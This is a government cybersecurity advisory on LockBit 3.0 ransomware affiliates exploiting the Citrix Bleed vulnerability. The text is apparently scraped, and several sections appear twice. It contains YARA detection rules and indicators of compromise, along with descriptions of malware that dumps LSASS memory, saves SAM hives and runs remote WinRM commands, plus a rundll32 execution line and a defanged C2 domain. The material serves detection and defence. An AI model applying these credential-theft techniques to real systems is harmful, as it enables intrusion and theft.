Below, are CISA developed YARA rules and an open-source rule that may be used to detect malicious activity in the Citrix NetScaler ADC and Gateway software environment. For more information on detecting suspicious activity within NetScaler logs or additional resources, visit CISA’s Malware Analysis Report (MAR) MAR-10478915-1.v1 Citrix Bleed or the resource section of this CSA [3]:
YARA Rules
CISA received four files for analysis that show files being used to save registry hives, dump the Local Security Authority Subsystem Service (LSASS) process memory to disk, and attempt to establish sessions via Windows Remote Management (WinRM). The files include:

Windows Batch file (.bat)
Windows Executable (.exe)
Windows Dynamic Link Library (.dll)
Python Script (.py)




rule CISA_10478915_01 : trojan installs_other_components{meta:author = ""CISA Code & Media Analysis""incident = ""10478915""date = ""2023-11-06""last_modified = ""20231108_1500""actor = ""n/a""family = ""n/a""capabilities = ""installs-other-components""malware_Type = ""trojan""tool_type = ""information-gathering""description = ""Detects trojan .bat samples""sha256 = ""98e79f95cf8de8ace88bf223421db5dce303b112152d66ffdf27ebdfcdf967e9""strings:$s1 = { 63 3a 5c 77 69 6e 64 6f 77 73 5c 74 61 73 6b 73 5c 7a 2e 74 78 74 }$s2 = { 72 65 67 20 73 61 76 65 20 68 6b 6c 6d 5c 73 79 73 74 65 6d 20 63 3a 5c 77 69 6e 64 6f 77 73 5c 74 61 73 6b 735c 65 6d }$s3 = { 6d 61 6b 65 63 61 62 20 63 3a 5c 75 73 65 72 73 5c 70 75 62 6c 69 63 5c 61 2e 70 6e 67 20 63 3a 5c 77 69 6e 646f 77 73 5c 74 61 73 6b 73 5c 61 2e 63 61 62 }condition:all of them}



This file is a Windows batch file called a.bat that is used to execute the file called a.exe with the file called a.dll as an argument. The output is printed to a file named 'z.txt' located in the path C:\Windows\Tasks. Next, a.bat pings the loop back internet protocol (IP) address 127.0.0[.]1 three times.
The next command it runs is reg save to save the HKLM\SYSTEM registry hive into the C:\Windows\tasks\em directory. Again, a.bat pings the loop back address 127.0.0[.]1 one time before executing another reg save command and saves the HKLM\SAM registry hive into the C:\Windows\Task\am directory. Next, a.bat runs three makecab commands to create three cabinet (.cab) files from the previously mentioned saved registry hives and one file named C:\Users\Public\a.png. The names of the .cab files are as follows:

c:\windows\tasks\em.cab
c:\windows\tasks\am.cab
c:\windows\tasks\a.cab




rule CISA_10478915_02 : trojan installs_other_components{meta:author = ""CISA Code & Media Analysis""incident = ""10478915""date = ""2023-11-06""last_modified = ""20231108_1500""actor = ""n/a""family = ""n/a""capabilities = ""installs-other-components""malware_type = ""trojan""tool_type = ""unknown""description = ""Detects trojan PE32 samples""sha256 = ""e557e1440e394537cca71ed3d61372106c3c70eb6ef9f07521768f23a0974068""strings:$s1 = { 57 72 69 74 65 46 69 6c 65 }$s2 = { 41 70 70 50 6f 6c 69 63 79 47 65 74 50 72 6f 63 65 73 73 54 65 72 6d 69 6e 61 74 69 6f 6e 4d 65 74 68 6f 64 }$s3 = { 6f 70 65 72 61 74 6f 72 20 63 6f 5f 61 77 61 69 74 }$s4 = { 43 6f 6d 70 6c 65 74 65 20 4f 62 6a 65 63 74 20 4c 6f 63 61 74 6f 72 }$s5 = { 64 65 6c 65 74 65 5b 5d }$s6 = { 4e 41 4e 28 49 4e 44 29 }condition:uint16(0) == 0x5a4d and pe.imphash() == ""6e8ca501c45a9b85fff2378cffaa24b2"" and pe.size_of_code == 84480 and all ofthem}



This file is a 64-bit Windows command-line executable called a.exe that is executed by a.bat. This file issues the remote procedure call (RPC) ncalrpc:[lsasspirpc] to the RPC end point to provide a file path to the LSASS on the infected machine. Once the file path is returned, the malware loads the accompanying DLL file called a.dll into the running LSASS process. If the DLL is correctly loaded, then the malware outputs the message ""[*]success"" in the console.



rule CISA_10478915_03 : trojan steals_authentication_credentials credential_exploitation{meta:author = ""CISA Code & Media Analysis""incident = ""10478915""date = ""2023-11-06""last_modified = ""20231108_1500""actor = ""n/a""family = ""n/a""capabilities = ""steals-authentication-credentials""malware_type = ""trojan""tool_type = ""credential-exploitation""description = ""Detects trojan DLL samples""sha256 = ""17a27b1759f10d1f6f1f51a11c0efea550e2075c2c394259af4d3f855bbcc994""strings:$s1 = { 64 65 6c 65 74 65 }$s2 = { 3c 2f 74 72 75 73 74 49 6e 66 6f 3e }$s3 = { 42 61 73 65 20 43 6c 61 73 73 20 44 65 73 63 72 69 70 74 6f 72 20 61 74 20 28 }$s4 = { 49 6e 69 74 69 61 6c 69 7a 65 43 72 69 74 69 63 61 6c 53 65 63 74 69 6f 6e 45 78 }$s5 = { 46 69 6e 64 46 69 72 73 74 46 69 6c 65 45 78 57 }$s6 = { 47 65 74 54 69 63 6b 43 6f 75 6e 74 }condition:uint16(0) == 0x5a4d and pe.subsystem == pe.SUBSYSTEM_WINDOWS_CUI and pe.size_of_code == 56832 and all ofthem}



This file is a 64-bit Windows DLL called a.dll that is executed by a.bat as a parameter for the file a.exe. The file a.exe loads this file into the running LSASS process on the infected machine. The file a.dll calls the Windows API CreateFileW to create a file called a.png in the path C:\Users\Public.
Next, a.dll loads DbgCore.dll then utilizes MiniDumpWriteDump function to dump LSASS process memory to disk. If successful, the dumped process memory is written to a.png. Once this is complete, the file a.bat specifies that the file a.png is used to create the cabinet file called a.cab in the path C:\Windows\Tasks.



rule CISA_10478915_04 : backdoor communicates_with_c2 remote_access{meta:author = ""CISA Code & Media Analysis""incident = ""10478915""date = ""2023-11-06""last_modified = ""20231108_1500""actor = ""n/a""family = ""n/a""capabilities = ""communicates-with-c2""malware_type = ""backdoor""tool_type = ""remote-access""description = ""Detects trojan python samples""sha256 = ""906602ea3c887af67bcb4531bbbb459d7c24a2efcb866bcb1e3b028a51f12ae6""strings:$s1 = { 70 6f 72 74 20 3d 20 34 34 33 20 69 66 20 22 68 74 74 70 73 22 }$s2 = { 6b 77 61 72 67 73 2e 67 65 74 28 22 68 61 73 68 70 61 73 73 77 64 22 29 3a }$s3 = { 77 69 6e 72 6d 2e 53 65 73 73 69 6f 6e 20 62 61 73 69 63 20 65 72 72 6f 72 }$s4 = { 57 69 6e 64 77 6f 73 63 6d 64 2e 72 75 6e 5f 63 6d 64 28 73 74 72 28 63 6d 64 29 29 }condition:all of them}



This file is a Python script called a.py that attempts to leverage WinRM to establish a session. The script attempts to authenticate to the remote machine using NT LAN Manager (NTLM) if the keyword ""hashpasswd"" is present. If the keyword ""hashpasswd"" is not present, then the script attempts to authenticate using basic authentication. Once a WinRM session is established with the remote machine, the script has the ability to execute command line arguments on the remote machine. If there is no command specified, then a default command of “whoami” is run.
Open Source YARA Rule



Import ""pe"" rule M_Hunting_Backdoor_FREEFIRE {meta: author = ""Mandiant"" description = ""This is a hunting rule to detect FREEFIRE samples using OP code sequences in getLastRecord method"" md5 = ""eb842a9509dece779d138d2e6b0f6949"" malware_family = ""FREEFIRE"" strings: $s1 = { 72 ?? ?? ?? ?? 7E ?? ?? ?? ?? 72 ?? ?? ?? ?? 28 ?? ?? ?? ?? 28 ?? ?? ?? ?? 74 ?? ?? ?? ?? 25 72 ?? ?? ?? ?? 6F ?? ?? ?? ?? 25 72 ?? ?? ?? ?? 6F ?? ?? ?? ?? 25 6F ?? ?? ?? ?? 72 ?? ?? ?? ?? 72 ?? ?? ?? ?? 7E ?? ?? ?? ?? 28 ?? ?? ?? ?? 6F ?? ?? ?? ?? 6F ?? ?? ?? ?? 74 ?? ?? ?? ?? 25 6F ?? ?? ?? ?? 73 ?? ?? ?? ?? 6F ?? ?? ?? ?? ?? 6F ?? ?? ?? ?? 7E ?? ?? ?? ?? ?? 6F ?? ?? ?? ?? 72 ?? ?? ?? ?? ?? 6F ?? ?? ?? ?? ?? } condition: uint16(0) == 0x5A4D and filesize >= 5KB and pe.imports(""mscoree.dll"") and all of them }



INCIDENT RESPONSE
Organizations are encouraged to assess Citrix software and your systems for evidence of compromise, and to hunt for malicious activity (see Additional Resources section).If compromise is suspected or detected, organizations should assume that threat actors hold full administrative access and can perform all tasks associated with the web management software as well as installing malicious code.
If a potential compromise is detected, organizations should:

Quarantine or take offline potentially affected hosts.
Reimage compromised hosts.
Create new account credentials.
Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.

Note: Removing malicious administrator accounts may not fully mitigate risk considering threat actors may have established additional persistence mechanisms.


Report the compromise to FBI Internet Crime Complaint Center (IC3) at IC3.gov, local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center (report@cisa.gov or 888-282-0870). State, local, tribal, or territorial government (SLTT) entities can also report to MS-ISAC (SOC@cisecurity.org or 866-787-4722). If outside of the US, please contact your national cyber center.

MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders using Citrix NetScaler ADC and Gateway software. CISA and authoring organizations recommend that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices to limit the impact of exploitation such as threat actors leveraging unpatched vulnerabilities within Citrix NetScaler appliances, which strengthens the security posture of their customers.
For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
The authoring organizations of this CSA recommend organizations implement the mitigations below to improve your cybersecurity posture on the basis of the threat actor activity and to reduce the risk of compromise associated with Citrix CVE 2023-4966 and LockBit 3.0 ransomware & ransomware affiliates. These mitigations align with the Cross-Sector Cybersecurity performance goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Isolate NetScaler ADC and Gateway appliances for testing until patching is ready and deployable.
Secure remote access tools by:

Implement application controls to manage and control the execution of software, including allowlisting remote access programs. Application controls should prevent the installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.


Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example [CPG 2.W]:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Restrict the use of PowerShell, using Group Policy, and only grant access to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell [CPG 2.E].
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities [CPG 1.E, 2.S, 2.T].
Enable enhanced PowerShell logging [CPG 2.T, 2.U].

PowerShell logs contain valuable data, including historical OS and registry interaction and possible TTPs of a threat actor’s PowerShell use.
Ensure PowerShell instances, using the latest version, have module, script block, and transcription logging enabled (enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows Event Log and the PowerShell Operational Log. FBI and CISA recommend turning on these two Windows Event Logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.


Configure the Windows Registry to require User Account Control (UAC) approval for any PsExec operations requiring administrator privileges to reduce the risk of lateral movement by PsExec.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Use longer passwords consisting of at least 15 characters [CPG 2.B].
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords [CPG 2.C].
Implement multiple failed login attempt account lockouts [CPG 2.G].
Disable password “hints.""
Require administrator credentials to install software.


Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should patch vulnerable software and hardware systems within 24 to 48 hours of vulnerability disclosure. Prioritize patching known exploited vulnerabilities in internet-facing systems [CPG 1.E].

Upgrade vulnerable NetScaler ADC and Gateway appliances to the latest version available to lower the risk of compromise.



VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 1).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and the authoring organizations recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
The Joint Ransomware Guide provides preparation, prevention, and mitigation best practices as well as a ransomware response checklist.
Cyber Hygiene Services and Ransomware Readiness Assessment provide no-cost cyber hygiene and ransomware readiness assessment services.
For more resources to help aid in the mitigation of cyber threats and ransomware attacks visit Strategies to Mitigate Cyber Security Incidents, Protect yourself from Ransomware, and How the ASD’s ACSC can help during a Cyber Security Incident.

REPORTING
The FBI is seeking any information that can be shared, to include boundary logs showing communication to and from foreign IP addresses, a sample ransom note, communications with LockBit 3.0 affiliates, Bitcoin wallet information, decryptor files, and/or a benign sample of an encrypted file. The FBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be recovered. Furthermore, payment may also embolden adversaries to target additional organizations, encourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities. Regardless of whether you or your organization have decided to pay the ransom, the FBI and CISA urge you to promptly report ransomware incidents to the FBI Internet Crime Complaint Center (IC3) at ic3.gov, local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center at report@cisa.gov or by calling 1-844-Say-CISA (1-844-729-2472).
Australian organizations that have been impacted or require assistance in regard to a ransomware incident can contact ASD’s ACSC via 1300 CYBER1 (1300 292 371), or by submitting a report to cyber.gov.au.
DISCLAIMER
The information in this report is being provided “as is” for informational purposes only. CISA and authoring organizations do not endorse any commercial entity, product, company, or service, including any entities, products, or services linked within this document. Any reference to specific commercial entities, products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply endorsement, recommendation, or favoring by CISA and the authoring organizations.
ACKNOWLEDGEMENTS
Boeing contributed to this CSA.
REFERENCES
[1] NetScaler ADC and NetScaler Gateway Security Bulletin for CVE-2023-4966[2] What is Mshta, How Can it Be Used and How to Protect Against it (McAfee)[3] Investigation of Session Hijacking via Citrix NetScaler ADC and Gateway Vulnerability (CVE-2023-4966)
VERSION HISTORY
November 21, 2023: Initial version.






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1539', 'T1563', 'T1082', 'T1556.006'}","



SUMMARY
Note: This joint Cybersecurity Advisory (CSA) is part of an ongoing #StopRansomware effort to publish advisories for network defenders that detail various ransomware variants and ransomware threat actors. These #StopRansomware advisories include recently and historically observed tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help organizations protect against ransomware. Visit stopransomware.gov to see all #StopRansomware advisories and to learn more about other ransomware threats and no-cost resources.
The Cybersecurity and Infrastructure Security Agency (CISA), Federal Bureau of Investigation (FBI), Multi-State Information Sharing & Analysis Center (MS-ISAC), and Australian Signals Directorate’s Australian Cyber Security Centre (ASD’s ACSC) are releasing this joint Cybersecurity Advisory (CSA) to disseminate IOCs, TTPs, and detection methods associated with LockBit 3.0 ransomware exploiting CVE-2023-4966, labeled Citrix Bleed, affecting Citrix NetScaler web application delivery control (ADC) and NetScaler Gateway appliances.
This CSA provides TTPs and IOCs obtained from FBI, ACSC, and voluntarily shared by Boeing. Boeing observed LockBit 3.0 affiliates exploiting CVE-2023-4966, to obtain initial access to Boeing Distribution Inc., its parts and distribution business that maintains a separate environment. Other trusted third parties have observed similar activity impacting their organization.
Historically, LockBit 3.0 affiliates have conducted attacks against organizations of varying sizes across multiple critical infrastructure sectors, including education, energy, financial services, food and agriculture, government and emergency services, healthcare, manufacturing, and transportation. Observed TTPs for LockBit ransomware attacks can vary significantly in observed TTPs.
Citrix Bleed, known to be leveraged by LockBit 3.0 affiliates, allows threat actors to bypass password requirements and multifactor authentication (MFA), leading to successful session hijacking of legitimate user sessions on Citrix NetScaler web application delivery control (ADC) and Gateway appliances. Through the takeover of legitimate user sessions, malicious actors acquire elevated permissions to harvest credentials, move laterally, and access data and resources.
CISA and the authoring organizations strongly encourage network administrators to apply the mitigations found in this CSA, which include isolating NetScaler ADC and Gateway appliances and applying necessary software updates through the Citrix Knowledge Center.
The authoring organizations encourage network defenders to hunt for malicious activity on their networks using the detection methods and IOCs within this CSA. If a potential compromise is detected, organizations should apply the incident response recommendations. If no compromise is detected, organizations should immediately apply patches made publicly available.
For the associated Malware Analysis Report (MAR), see: MAR-10478915-1.v1 Citrix Bleed
Download the PDF version of this report:


AA23-325A LockBit 3.0 Ransomware Affiliates Exploit CVE 2023-4966 Citrix Bleed Vulnerability
(PDF,       631.83 KB
  )


For a downloadable copy of IOCs, see:


AA23-325A STIX XML
(XML,       29.22 KB
  )




AA23-325A STIX JSON
(JSON,       23.00 KB
  )


TECHNICAL DETAILS
Note: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 14. See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK tactics and techniques. For assistance with mapping malicious cyber activity to the MITRE ATT&CK framework, see CISA and MITRE ATT&CK’s Best Practices for MITRE ATT&CK Mapping and CISA’s Decider Tool.
CVE-2023-4966
CVE-2023-4966 is a software vulnerability found in Citrix NetScaler ADC and NetScaler Gateway appliances with exploitation activity identified as early as August 2023. This vulnerability provides threat actors, including LockBit 3.0 ransomware affiliates, the capability to bypass MFA, and hijack legitimate user sessions,.
After acquiring access to valid cookies, LockBit 3.0 affiliates establish an authenticated session within the NetScaler appliance without a username, password, or access to MFA tokens,. Affiliates acquire this by sending an HTTP GET request with a crafted HTTP Host header, leading to a vulnerable appliance returning system memory information,. The information obtained through this exploit contains a valid NetScaler AAA session cookie.
Citrix publicly disclosed CVE-2023-4966 on Oct. 10, 2023, within their Citrix Security Bulletin, which issued guidance, and detailed the affected products, IOCs, and recommendations. Based on widely available public exploits and evidence of active exploitation, CISA added this vulnerability to the Known Exploited Vulnerabilities (KEVs) Catalog. This critical vulnerability exploit impacts the following software versions,1,:

NetScaler ADC and NetScaler Gateway 14.1 before 14.1-8.50
NetScaler ADC and NetScaler Gateway 13.1 before 13.1-49.15
NetScaler ADC and NetScaler Gateway 13.0 before 13.0-92.19
NetScaler ADC and NetScaler Gateway version 12.1 (EOL)
NetScaler ADC 13.1FIPS before 13.1-37.163
NetScaler ADC 12.1-FIPS before 12.1-55.300
NetScaler ADC 12.1-NDcPP before 12.1-55.300

Due to the ease of exploitation, CISA and the authoring organizations expect to see widespread exploitation of the Citrix vulnerability in unpatched software services throughout both private and public networks.
Threat Actor Activity
Malware identified in this campaign is generated beginning with the execution of a PowerShell script (123.ps1) which concatenates two base64 strings together, converts them to bytes, and writes them to the designated file path.

The resulting file (adobelib.dll) is then executed by the PowerShell script using rundll32.
rundll32 C:\Users\Public\adobelib.dll,main <104 hex char key>
The Dynamic Link Library (DLL) will not execute correctly without the 104 hex character key. Following execution, the DLL attempts to send a POST request to https://adobe-us-updatefiles,.,digital/index.php which resolves to IP addresses 172.67.129,.,176 and 104.21.1,.,180 as of November 16, 2023. Although adobelib.dll and the adobe-us-updatefiles,.,digital have the appearance of legitimacy, the file and domain have no association with legitimate Adobe software and no identified interaction with the software.
Other observed activities include the use of a variety of TTPs commonly associated with ransomware activity. For example, LockBit 3.0 affiliates have been observed using AnyDesk and Splashtop remote management and monitoring (RMM), Batch and PowerShell scripts, the execution of HTA files using the Windows native utility mshta.exe and other common software tools typically associated with ransomware incidents.
INDICATORS OF COMPROMISE (IOCS)
See Table 1–Table 5 for IOCs related to Lockbit 3.0 affiliate exploitation of CVE-2023-4966.,Fidelity, Legend:

High = Indicator is unique or highly indicates LockBit in an environment.
Medium = Indicator was used by LockBit but is used outside of LockBit activity, albeit rarely.
Low = Indicates tools that are commonly used but were used by LockBit.

Low confidence indicators may not be related to ransomware.
Disclaimer: Some IP addresses in this CSA may be associated with legitimate activity. Organizations are encouraged to investigate the activity around these IP addresses prior to taking action, such as blocking. Activity should not be attributed as malicious without analytical evidence to support they are used at the direction of, or controlled by, threat actors.



The authoring organizations recommended monitoring/reviewing traffic to the 81.19.135,.,* class C network and review for MSHTA being called with HTTP arguments,2,.


MITRE ATT&CK TACTICS AND TECHNIQUES
See Table 6 and Table 7 for all referenced threat actor tactics and techniques in this advisory.


DETECTION METHODS
Hunting Guidance
Network defenders should prioritize observing users in session when hunting for network anomalies. This will aid the hunt for suspicious activity such as installing tools on the system (e.g., putty, rClone ), new account creation, log item failure, or running commands such as hostname, quser, whoami, net, and taskkill. Rotating credentials for identities provisioned for accessing resources via a vulnerable NetScaler ADC or Gateway appliance can also aid in detection.
For IP addresses:

Identify if NetScaler logs the change in IP.
Identify if users are logging in from geolocations uncommon for your organization’s user base.
If logging VPN authentication, identify if users are associated with two or more public IP addresses while in a different subnet or geographically dispersed.

Note: MFA to NetScaler will not operate as intended due to the attacker bypassing authentication by providing a token/session for an already authenticated user.
The following procedures can help identify potential exploitation of CVE-2023-4966 and LockBit 3.0 activity:

Search for filenames that contain tf0gYx2YI for identifying LockBit encrypted files.
LockBit 3.0 actors were seen using the C:\Temp directory for loading and the execution of files.
Investigate requests to the HTTP/S endpoint from WAF.
Hunt for suspicious login patterns from NetScaler logs
Hunt for suspicious virtual desktop agent Windows Registry keys
Analyze memory core dump files.

Below, are CISA developed YARA rules and an open-source rule that may be used to detect malicious activity in the Citrix NetScaler ADC and Gateway software environment. For more information on detecting suspicious activity within NetScaler logs or additional resources, visit CISA’s Malware Analysis Report (MAR) MAR-10478915-1.v1 Citrix Bleed or the resource section of this CSA,3,:
YARA Rules
CISA received four files for analysis that show files being used to save registry hives, dump the Local Security Authority Subsystem Service (LSASS) process memory to disk, and attempt to establish sessions via Windows Remote Management (WinRM). The files include:

Windows Batch file (.bat)
Windows Executable (.exe)
Windows Dynamic Link Library (.dll)
Python Script (.py)


This file is a Windows batch file called a.bat that is used to execute the file called a.exe with the file called a.dll as an argument. The output is printed to a file named 'z.txt' located in the path C:\Windows\Tasks. Next, a.bat pings the loop back internet protocol (IP) address 127.0.0,.,1 three times.
The next command it runs is reg save to save the HKLM\SYSTEM registry hive into the C:\Windows\tasks\em directory. Again, a.bat pings the loop back address 127.0.0,.,1 one time before executing another reg save command and saves the HKLM\SAM registry hive into the C:\Windows\Task\am directory. Next, a.bat runs three makecab commands to create three cabinet (.cab) files from the previously mentioned saved registry hives and one file named C:\Users\Public\a.png. The names of the .cab files are as follows:

c:\windows\tasks\em.cab
c:\windows\tasks\am.cab
c:\windows\tasks\a.cab


This file is a 64-bit Windows command-line executable called a.exe that is executed by a.bat. This file issues the remote procedure call (RPC) ncalrpc:,lsasspirpc, to the RPC end point to provide a file path to the LSASS on the infected machine. Once the file path is returned, the malware loads the accompanying DLL file called a.dll into the running LSASS process. If the DLL is correctly loaded, then the malware outputs the message "",*,success"" in the console.

This file is a 64-bit Windows DLL called a.dll that is executed by a.bat as a parameter for the file a.exe. The file a.exe loads this file into the running LSASS process on the infected machine. The file a.dll calls the Windows API CreateFileW to create a file called a.png in the path C:\Users\Public.
Next, a.dll loads DbgCore.dll then utilizes MiniDumpWriteDump function to dump LSASS process memory to disk. If successful, the dumped process memory is written to a.png. Once this is complete, the file a.bat specifies that the file a.png is used to create the cabinet file called a.cab in the path C:\Windows\Tasks.

This file is a Python script called a.py that attempts to leverage WinRM to establish a session. The script attempts to authenticate to the remote machine using NT LAN Manager (NTLM) if the keyword ""hashpasswd"" is present. If the keyword ""hashpasswd"" is not present, then the script attempts to authenticate using basic authentication. Once a WinRM session is established with the remote machine, the script has the ability to execute command line arguments on the remote machine. If there is no command specified, then a default command of “whoami” is run.
Open Source YARA Rule

INCIDENT RESPONSE
Organizations are encouraged to assess Citrix software and your systems for evidence of compromise, and to hunt for malicious activity (see Additional Resources section).If compromise is suspected or detected, organizations should assume that threat actors hold full administrative access and can perform all tasks associated with the web management software as well as installing malicious code.
If a potential compromise is detected, organizations should:

Quarantine or take offline potentially affected hosts.
Reimage compromised hosts.
Create new account credentials.
Collect and review artifacts such as running processes/services, unusual authentications, and recent network connections.

Note: Removing malicious administrator accounts may not fully mitigate risk considering threat actors may have established additional persistence mechanisms.


Report the compromise to FBI Internet Crime Complaint Center (IC3) at IC3.gov, local FBI Field Office, or CISA via the agency’s Incident Reporting System or its 24/7 Operations Center (report@cisa.gov or 888-282-0870). State, local, tribal, or territorial government (SLTT) entities can also report to MS-ISAC (SOC@cisecurity.org or 866-787-4722). If outside of the US, please contact your national cyber center.

MITIGATIONS
These mitigations apply to all critical infrastructure organizations and network defenders using Citrix NetScaler ADC and Gateway software. CISA and authoring organizations recommend that software manufacturers incorporate secure-by-design and -default principles and tactics into their software development practices to limit the impact of exploitation such as threat actors leveraging unpatched vulnerabilities within Citrix NetScaler appliances, which strengthens the security posture of their customers.
For more information on secure by design, see CISA’s Secure by Design and Default webpage and joint guide.
The authoring organizations of this CSA recommend organizations implement the mitigations below to improve your cybersecurity posture on the basis of the threat actor activity and to reduce the risk of compromise associated with Citrix CVE 2023-4966 and LockBit 3.0 ransomware & ransomware affiliates. These mitigations align with the Cross-Sector Cybersecurity performance goals (CPGs) developed by CISA and the National Institute of Standards and Technology (NIST). The CPGs provide a minimum set of practices and protections that CISA and NIST recommend all organizations implement. CISA and NIST based the CPGs on existing cybersecurity frameworks and guidance to protect against the most common and impactful threats, tactics, techniques, and procedures. Visit CISA’s Cross-Sector Cybersecurity Performance Goals for more information on the CPGs, including additional recommended baseline protections.

Isolate NetScaler ADC and Gateway appliances for testing until patching is ready and deployable.
Secure remote access tools by:

Implement application controls to manage and control the execution of software, including allowlisting remote access programs. Application controls should prevent the installation and execution of portable versions of unauthorized remote access and other software. A properly configured application allowlisting solution will block any unlisted application execution. Allowlisting is important because antivirus solutions may fail to detect the execution of malicious portable executables when the files use any combination of compression, encryption, or obfuscation.


Strictly limit the use of RDP and other remote desktop services. If RDP is necessary, rigorously apply best practices, for example,CPG 2.W,:

Audit the network for systems using RDP.
Close unused RDP ports.
Enforce account lockouts after a specified number of attempts.
Apply phishing-resistant multifactor authentication (MFA).
Log RDP login attempts.


Restrict the use of PowerShell, using Group Policy, and only grant access to specific users on a case-by-case basis. Typically, only those users or administrators who manage the network or Windows operating systems (OSs) should be permitted to use PowerShell,CPG 2.E,.
Update Windows PowerShell or PowerShell Core to the latest version and uninstall all earlier PowerShell versions. Logs from Windows PowerShell prior to version 5.0 are either non-existent or do not record enough detail to aid in enterprise monitoring and incident response activities,CPG 1.E, 2.S, 2.T,.
Enable enhanced PowerShell logging,CPG 2.T, 2.U,.

PowerShell logs contain valuable data, including historical OS and registry interaction and possible TTPs of a threat actor’s PowerShell use.
Ensure PowerShell instances, using the latest version, have module, script block, and transcription logging enabled (enhanced logging).
The two logs that record PowerShell activity are the PowerShell Windows Event Log and the PowerShell Operational Log. FBI and CISA recommend turning on these two Windows Event Logs with a retention period of at least 180 days. These logs should be checked on a regular basis to confirm whether the log data has been deleted or logging has been turned off. Set the storage size permitted for both logs to as large as possible.


Configure the Windows Registry to require User Account Control (UAC) approval for any PsExec operations requiring administrator privileges to reduce the risk of lateral movement by PsExec.
Implement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and servers in a physically separate, segmented, and secure location (e.g., hard drive, storage device, or the cloud).
Require all accounts with password logins (e.g., service account, admin accounts, and domain admin accounts) to comply with NIST's standards for developing and managing password policies.

Use longer passwords consisting of at least 15 characters,CPG 2.B,.
Store passwords in hashed format using industry-recognized password managers.
Add password user “salts” to shared login credentials.
Avoid reusing passwords,CPG 2.C,.
Implement multiple failed login attempt account lockouts,CPG 2.G,.
Disable password “hints.""
Require administrator credentials to install software.


Keep all operating systems, software, and firmware up to date. Timely patching is one of the most efficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity threats. Organizations should patch vulnerable software and hardware systems within 24 to 48 hours of vulnerability disclosure. Prioritize patching known exploited vulnerabilities in internet-facing systems,CPG 1.E,.

Upgrade vulnerable NetScaler ADC and Gateway appliances to the latest version available to lower the risk of compromise.



VALIDATE SECURITY CONTROLS
In addition to applying mitigations, CISA recommends exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory. CISA recommends testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory.
To get started:

Select an ATT&CK technique described in this advisory (see Table 1).
Align your security technologies against the technique.
Test your technologies against the technique.
Analyze your detection and prevention technologies’ performance.
Repeat the process for all security technologies to obtain a set of comprehensive performance data.
Tune your security program, including people, processes, and technologies, based on the data generated by this process.

CISA and the authoring organizations recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory.
RESOURCES

Stopransomware.gov is a whole-of-government approach that gives one central location for ransomware resources and alerts.
The Joint Ransomware Guide provides preparation, prevention, and mitigation best practices as well as a ransomware response checklist.
Cyber Hygiene Services and Ransomware Readiness Assessment provide no-cost cyber hygiene and ransomware readiness assessment services.
For more resources to help aid in the mitigation of cyber threats and ransomware attacks visit Strategies to Mitigate Cyber Security Incidents, Protect yourself from Ransomware, and How the ASD’s ACSC can help during a Cyber Security Incident.

REPORTING
